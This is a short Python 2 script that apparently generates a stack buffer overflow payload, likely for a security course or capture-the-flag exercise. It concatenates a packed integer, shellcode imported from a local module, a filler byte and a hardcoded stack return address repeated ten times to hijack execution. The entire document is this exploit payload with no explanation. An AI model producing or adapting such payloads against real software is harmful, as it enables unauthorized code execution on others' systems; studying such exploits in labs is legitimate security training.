from struct import pack
from shellcode import shellcode

print pack("<I", 0xffffffff) + shellcode + '0' + pack("<I", 0xbffe9560)*10
